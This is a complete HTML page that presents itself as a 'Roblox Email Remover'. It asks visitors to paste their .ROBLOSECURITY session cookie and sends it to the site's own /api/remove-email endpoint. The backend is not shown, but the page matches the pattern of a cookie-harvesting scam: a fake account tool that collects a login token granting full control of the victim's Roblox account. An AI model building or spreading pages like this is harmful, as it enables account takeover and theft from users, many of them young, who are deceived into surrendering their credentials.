<!DOCTYPE html>
<html>
<head>
  <title>Roblox Email Remover</title>
  <style>
    body {
      background-color: #f1f5f9;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 60px;
    }
    h2 {
      color: #333;
    }
    input, button {
      width: 300px;
      padding: 10px;
      margin-top: 10px;
      font-size: 1rem;
    }
    .result {
      margin-top: 20px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h2>Remove Email from Roblox</h2>
  <input id="cookie" placeholder=".ROBLOSECURITY Cookie" />
  <button onclick="submit()">Remove Email</button>
  <div class="result" id="result"></div>

  <script>
    async function submit() {
      const cookie = document.getElementById('cookie').value;
      const result = document.getElementById('result');
      result.innerText = 'Processing...';

      try {
        const res = await fetch('/api/remove-email', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ cookie })
        });

        const data = await res.json();
        result.innerText = data.status === 'success' ? '✅ ' + data.message : '❌ ' + data.message;
      } catch {
        result.innerText = '❌ Request failed.';
      }
    }
  </script>
</body>
</html>
